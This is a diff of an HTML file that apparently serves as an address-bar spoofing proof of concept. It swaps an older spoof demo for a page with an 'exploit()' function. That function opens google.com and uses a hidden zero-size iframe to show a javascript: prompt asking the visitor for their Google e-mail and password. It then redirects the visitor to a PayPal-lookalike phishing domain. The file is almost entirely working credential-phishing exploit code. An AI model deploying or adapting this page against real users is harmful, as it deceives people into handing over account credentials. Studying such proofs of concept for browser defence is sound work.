@@ -1,9 +1,26 @@
-<h1>Address bar says https://xisigr.com - this is NOT https://xisigr.com</h1>
-<button onclick="alert(document.domain)">haaaaa</button>
-<script>
- alert();
-window.history.go(1);
-window.history.go(-1);
- window.history.go(-1);
-aler();
-</script>
+<html>
+  <body>
+
+    <script>
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
+
+    }
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
+</html>
